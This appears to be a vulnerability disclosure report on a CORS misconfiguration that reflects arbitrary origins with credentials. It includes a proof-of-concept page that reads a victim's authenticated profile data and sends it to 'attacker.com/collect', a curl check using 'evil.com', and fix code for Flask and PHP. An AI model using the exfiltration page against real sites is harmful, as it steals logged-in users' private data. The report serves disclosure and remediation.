# cors-misconfiguration-arbitrary-origin-credentials
Professional security write-up documenting a high-severity CORS misconfiguration allowing arbitrary origin trust with credentialed cross-origin requests, leading to authenticated user data exposure.
[cors-misconfiguration-writeup.md](https://github.com/user-attachments/files/27270693/cors-misconfiguration-writeup.md)
# CORS Misconfiguration — Arbitrary Origin Trusted with Credentials

**Target:** `[target]`  
**Date:** `[YYYY-MM-DD]`  
**Researcher:** `[researcher]`  
**Severity:** 🔴 High  
**Status:** Reported  
**CVSSv3.1 Score:** 8.2 / 10

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Vulnerability Details](#vulnerability-details)
3. [Risk Assessment](#risk-assessment)
4. [Technical Analysis](#technical-analysis)
5. [Proof of Concept](#proof-of-concept)
6. [Impact](#impact)
7. [Remediation](#remediation)
8. [References](#references)

---

## Executive Summary

A Cross-Origin Resource Sharing (CORS) misconfiguration was identified on `[target]` in which the application dynamically reflects any attacker-controlled `Origin` header value directly into the `Access-Control-Allow-Origin` response header. Combined with `Access-Control-Allow-Credentials: true`, this completely nullifies the browser's Same-Origin Policy, allowing any third-party website to perform credentialed cross-origin requests and silently read authenticated API responses on behalf of any logged-in user.

The vulnerability was confirmed on two endpoints:
- `/api/v1/users` — public user enumeration endpoint
- `/api/v1/users/me` — authenticated endpoint returning private user data

---

## Vulnerability Details

| Field | Value |
|---|---|
| **Vulnerability Class** | CORS Misconfiguration |
| **CWE** | CWE-942 — Overly Permissive Cross-domain Whitelist |
| **OWASP** | A05:2021 — Security Misconfiguration |
| **Affected Host** | `[target]` |
| **Affected Endpoints** | `/api/v1/users`, `/api/v1/users/me` |
| **Authentication Required** | No (users) / Yes (users/me) |
| **HTTP Method** | GET |

---

## Risk Assessment

### CVSS v3.1 Base Score

| Metric | Value | Rationale |
|---|---|---|
| Attack Vector (AV) | Network (N) | Exploitable remotely via browser |
| Attack Complexity (AC) | Low (L) | No special conditions required |
| Privileges Required (PR) | None (N) | No attacker authentication needed |
| User Interaction (UI) | Required (R) | Victim must visit attacker-controlled page |
| Scope (S) | Changed (C) | Impact crosses to victim's authenticated session |
| Confidentiality (C) | High (H) | Private user data fully readable |
| Integrity (I) | Low (L) | Potential for state-modifying requests |
| Availability (A) | None (N) | No denial of service impact |

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N
Base Score: 8.2 — HIGH
```

### Risk Matrix

```
              LOW IMPACT   MEDIUM IMPACT   HIGH IMPACT
HIGH LIKELY  |   Medium   |     High      |  CRITICAL  |
MED LIKELY   |    Low     |    Medium     |    High    |
LOW LIKELY   |    Low     |     Low       |   Medium   |
```

> **This finding: High Likelihood × High Impact = 🔴 Critical Concern**

**Likelihood — High:** Requires no special tooling, no authentication, and is trivially exploitable via a single HTML page hosted anywhere on the internet.

**Impact — High:** Successful exploitation directly exposes authenticated user data including email addresses, roles, and session-sensitive information of any user who visits the attacker's page.

---

## Technical Analysis

### Root Cause

The application is configured to echo back any `Origin` header supplied in the request without validation against a trusted whitelist. This behavior, combined with `Access-Control-Allow-Credentials: true`, creates a complete bypass of the browser's Same-Origin Policy.

### Vulnerable Request

```http
GET /api/v1/users/me HTTP/2
Host: [target]
Origin: https://attacker-controlled.com
Cookie: [victim session cookie — sent automatically by browser]
```

### Vulnerable Response

```http
HTTP/2 200 OK
Access-Control-Allow-Origin: https://attacker-controlled.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: OPTIONS, GET, POST, PUT, PATCH, DELETE
Access-Control-Allow-Headers: Authorization, Content-Type, Content-MD5
Content-Type: application/json; charset=UTF-8
```

### Why This Is Dangerous

Under a correct CORS policy, the browser blocks cross-origin reads unless the response explicitly allows the requesting origin. By reflecting the attacker's origin, the server convinces the browser that the request is legitimate, allowing the attacker's JavaScript to read the full response body — including all private user data.

The critical combination that enables exploitation:

```
Access-Control-Allow-Origin: <attacker origin>  ← arbitrary origin accepted
Access-Control-Allow-Credentials: true           ← session cookies included
```

---

## Proof of Concept

### Attack Scenario

1. Attacker hosts the exploit page at `https://attacker.com/exploit.html`
2. Attacker sends the link to an authenticated user of `[target]`
3. Victim visits the page — no interaction required beyond page load
4. Private user data is silently exfiltrated to the attacker's server

### Exploit Page

```html
<!DOCTYPE html>
<html>
<head><title>PoC - CORS Misconfiguration</title></head>
<body>
<pre id="output">Loading...</pre>
<script>
fetch("https://[target]/api/v1/users/me", {
  method: "GET",
  credentials: "include"
})
.then(response => response.json())
.then(data => {
  document.getElementById("output").textContent = JSON.stringify(data, null, 2);

  // Exfiltrate to attacker's server
  fetch("https://attacker.com/collect", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data)
  });
})
.catch(err => {
  document.getElementById("output").textContent = "Error: " + err;
});
</script>
</body>
</html>
```

### Verification Command

```bash
curl -si "https://[target]/api/v1/users/me" \
  -H "Origin: https://evil.com" | grep -i "access-control"

# Expected vulnerable output:
# access-control-allow-origin: https://evil.com
# access-control-allow-credentials: true
# access-control-allow-methods: OPTIONS, GET, POST, PUT, PATCH, DELETE
```

---

## Impact

### Direct Impact

| Affected Endpoint | Data Exposed | Severity |
|---|---|---|
| `/api/v1/users/me` | Email, roles, capabilities, private user meta | 🔴 High |
| `/api/v1/users` | Display names, slugs, public profile data | 🟠 Medium |

### Attack Characteristics

Any authenticated user who can be induced to visit an attacker-controlled page — via phishing, malicious ads, or social engineering — is vulnerable. The attack is:

- **Silent** — no visual indication to the victim
- **Zero-click** — no interaction required beyond page load
- **Session-scoped** — works for the entire duration of the user's session
- **Scalable** — a single exploit page affects all authenticated visitors simultaneously

---

## Remediation

### Recommended Fix

Replace dynamic origin reflection with a strict server-side whitelist:

```python
# Example: Python/Flask
ALLOWED_ORIGINS = [
    "https://example.com",
    "https://www.example.com",
]

@app.after_request
def apply_cors(response):
    origin = request.headers.get("Origin", "")
    if origin in ALLOWED_ORIGINS:
        response.headers["Access-Control-Allow-Origin"] = origin
        response.headers["Access-Control-Allow-Credentials"] = "true"
    return response
```

```php
// Example: PHP
$allowed_origins = ['https://example.com', 'https://www.example.com'];
$origin = $_SERVER['HTTP_ORIGIN'] ?? '';

if (in_array($origin, $allowed_origins, true)) {
    header("Access-Control-Allow-Origin: {$origin}");
    header('Access-Control-Allow-Credentials: true');
}
```

### Additional Hardening

- Remove `Access-Control-Allow-Credentials: true` from endpoints that do not require cross-origin authenticated access
- Disable or require authentication on user enumeration endpoints
- Implement a Content Security Policy (CSP) to limit lateral damage from any future client-side vulnerabilities

---

## References

- [PortSwigger — CORS Misconfiguration](https://portswigger.net/web-security/cors)
- [OWASP — Testing for CORS](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing)
- [CWE-942 — Overly Permissive Cross-domain Whitelist](https://cwe.mitre.org/data/definitions/942.html)
- [Exploiting CORS Misconfigurations for Bitcoins and Bounties](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
- [PayloadsAllTheThings — CORS Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CORS%20Misconfiguration/README.md)

---

*This report was produced during authorized security research. No sensitive user data was accessed or stored.*
